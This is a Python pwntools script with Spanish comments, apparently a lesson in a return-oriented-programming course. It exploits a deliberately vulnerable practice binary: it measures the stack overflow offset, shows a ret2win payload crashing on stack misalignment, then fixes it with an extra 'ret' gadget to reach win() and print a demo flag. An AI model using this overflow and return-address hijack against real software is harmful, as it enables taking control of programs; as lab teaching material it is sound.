#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""B1 - ret2win 64-bit: RIP = p64(elf.symbols['win']).
FASE 1: offset con patron ciclico (metodo A2 de la Parte 1).
FASE 2: la trampa clasica - saltar a win() SIN alinear la pila
        (crash en movaps dentro de printf, con flag a medias).
FASE 3: solucion - gadget 'ret' extra delante de win().
TODO dinamico: simbolos y gadgets del ELF, nada hardcodeado.
USO: python3 b1_ret2win.py"""
from pwn import *
import os

context.arch = 'amd64'
context.log_level = 'info'

BIN = './b1_ret2win'
FLAG_DEMO = 'flag{ROP_B1_ret2win_alineado}'

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-o', BIN, 'b1_ret2win.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

# flag.txt de practica: solo si no existe (no pisa la tuya)
if not os.path.exists('flag.txt'):
    with open('flag.txt', 'w') as f:
        f.write(FLAG_DEMO + '\n')
    log.info('flag.txt de practica creado')

elf = ELF(BIN, checksec=False)   # simbolos dinamicos: nada hardcodeado
win = elf.symbols['win']
log.info("win() vive en %#x (ejemplo de ESTA compilacion; la tuya sera distinta)", win)

# ------------------------------------------------------------------
# FASE 1 - offset dinamico: patron ciclico + corefile (metodo A2)
# ------------------------------------------------------------------
io = process(BIN)   # No PIE: las direcciones del binario ya son fijas
io.recvuntil(b'nadie la llama')
io.sendline(cyclic(200))
io.wait()
try:
    core = io.corefile
    offset = cyclic_find(core.read(core.rsp, 4))   # x86_64: leer desde $rsp
except Exception:
    from pwnlib.corefile import Corefile
    core = Corefile('core')
    offset = cyclic_find(core.read(core.rsp, 4))
io.close()
log.info('Offset medido en caliente: %d bytes (buffer 64 + RBP 8)', offset)

# gadget 'ret' suelto del PROPIO binario (para la alineacion de FASE 3)
ret_gadget = ROP(elf).find_gadget(['ret'])[0]
log.info('Gadget de alineacion: ret @ %#x', ret_gadget)

# ------------------------------------------------------------------
# FASE 2 - TRAMPA: payload directo a win() SIN gadget de alineacion
# ------------------------------------------------------------------
log.info('FASE 2: intento ingenuo padding + p64(win) sin ret extra...')
io = process(BIN)
io.recvuntil(b'nadie la llama')
io.sendline(b'A' * offset + p64(win))
salida = io.recvall(timeout=3)
io.wait()
crash_trampa = (io.poll() == -signal.SIGSEGV)
if crash_trampa:
    log.warning('TRAMPA CONFIRMADA: SIGSEGV dentro de win()/printf '
                '(movaps exige pila alineada a 16). Flag parcial: %r',
                salida[salida.find(b'FLAG'):salida.find(b'FLAG') + 24])
elif FLAG_DEMO.encode() in salida:
    log.info('Tu glibc no choca con movaps en esta ruta; el ret extra '
             'sigue siendo la practica correcta.')
io.close()

# ------------------------------------------------------------------
# FASE 3 - SOLUCION: un gadget 'ret' extra re-alinea la pila
#   payload = 'A'*offset + p64(ret) + p64(win)
# ------------------------------------------------------------------
io = process(BIN)
io.recvuntil(b'nadie la llama')
payload = b'A' * offset + p64(ret_gadget) + p64(win)
assert b'\n' not in payload, 'gets() cortaria el payload en el primer 0x0a'
io.sendline(payload)
salida = io.recvall(timeout=3)
io.close()

if FLAG_DEMO.encode() in salida:
    log.success('B1 SUPERADO: ret consumio el gadget ret y salto a win(); '
                'pila alineada, flag completa en pantalla.')
else:
    log.failure('B1: sin flag. Pistas: offset, pwn checksec (No PIE, '
                'sin canary) y que flag.txt exista junto al binario.')
